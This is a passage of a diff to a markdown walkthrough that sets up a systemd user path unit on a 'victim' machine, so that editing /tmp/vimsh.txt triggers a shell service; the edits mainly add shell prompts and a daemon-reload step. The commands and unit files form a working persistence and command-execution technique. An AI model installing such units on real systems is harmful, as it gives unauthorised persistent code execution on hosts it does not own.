@@ -49,24 +49,26 @@ ExecStart=/bin/sh
 3. Generate a path file to execute the shell service
 
 ```ini
+$ cat vimsh.path
 ; https://www.freedesktop.org/software/systemd/man/systemd.path.html
 [Path]
 PathModified=/tmp/vimsh.txt
 Unit=execshell.service
 ```
 
-4. Install into the systemd user folder on the victim
+4. Install into the systemd user folder on the victim and reload the units
 
 ```sh
-mkdir -p ~/.config/systemd/user/
-ln -s `pwd`/execshell.service ~/.config/systemd/user/
-ln -s `pwd`/vimsh.path ~/.config/systemd/user/
+$ mkdir -p ~/.config/systemd/user/
+$ ln -s `pwd`/execshell.service ~/.config/systemd/user/
+$ ln -s `pwd`/vimsh.path ~/.config/systemd/user/
+$ systemctl --user daemon-reload
 ```
 
 5. Start the path unit
 
 ```sh
-systemctl --user start vimsh.path
+$ systemctl --user start vimsh.path
 ```
 
 6. Open up the file `/tmp/vimsh.txt` to add shell commands to, and save it when ready
